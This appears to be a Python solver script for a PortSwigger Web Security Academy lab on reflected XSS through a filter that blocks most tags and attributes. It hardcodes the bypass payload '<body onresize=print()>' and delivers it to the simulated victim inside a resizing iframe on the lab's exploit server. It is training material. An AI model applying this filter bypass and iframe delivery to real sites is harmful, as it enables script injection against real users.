#!/usr/bin/env python3
"""
Reflected XSS into HTML context with most tags and attributes blocked
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 14-reflected-xss-most-tags-and-attributes-blocked.md

What this does -- and a note on what it doesn't re-run every time:
    The application's filter rejects most tags and most event-handler
    attributes. Finding what it *does* allow required fuzzing the search
    parameter against the PortSwigger XSS cheat sheet's tag list (looking
    for a 200 instead of a blocked response), which surfaced <body>, then
    fuzzing the cheat sheet's event-attribute list with <body %s=1> as the
    carrier, which surfaced onresize. That sweep is a one-time discovery
    step, not something worth re-running on every solve -- this script, like
    our internal capability wrapper, encodes the confirmed result directly:
    <body onresize=print()>. onresize doesn't fire on normal page load, so
    the payload is delivered inside an iframe on the lab's exploit server
    whose onload handler immediately shrinks the iframe's width, firing the
    embedded page's onresize handler with no victim interaction required.

Usage:
    python 14-reflected-xss-most-tags-and-attributes-blocked.py <lab-url>
    e.g. python 14-reflected-xss-most-tags-and-attributes-blocked.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import urllib.parse
import httpx

# Discovered via cheat-sheet fuzzing: <body> is one of the few tags the
# filter allows through, and onresize is one of the few events it allows.
PAYLOAD = "<body onresize=print()>"


def get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    if not m:
        raise RuntimeError("could not find exploit server URL on lab homepage")
    return m.group(1).rstrip("/")


def exploit_server_deliver(exploit_url: str, body: str) -> bool:
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        form_data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": headers,
            "responseBody": body,
        }

        form_data["formAction"] = "STORE"
        r_store = c.post(exploit_url, data=form_data)
        if r_store.status_code >= 400:
            print(f"[!] Exploit server STORE failed: {r_store.status_code}")
            return False

        form_data["formAction"] = "DELIVER_TO_VICTIM"
        r_deliver = c.post(exploit_url, data=form_data)
        success = r_deliver.status_code < 400
        print(f"[{'+' if success else '!'}] DELIVER_TO_VICTIM {'sent' if success else 'failed'} (status {r_deliver.status_code})")
        return success


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")

    exploit_url = get_exploit_server_url(client)
    print(f"[*] Exploit server: {exploit_url}")

    xss_url_param = urllib.parse.quote(PAYLOAD)
    iframe_body = (
        f'<iframe src="{lab_url}/?search={xss_url_param}" '
        f'onload="this.style.width=\'100px\'"></iframe>'
    )
    print(f"[*] Payload: {PAYLOAD}")
    print(f"[*] Iframe delivery: {iframe_body}")
    exploit_server_deliver(exploit_url, iframe_body)

    print("[*] Waiting for the simulated victim to load the exploit...")
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- try re-running, or check the exploit server access log.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
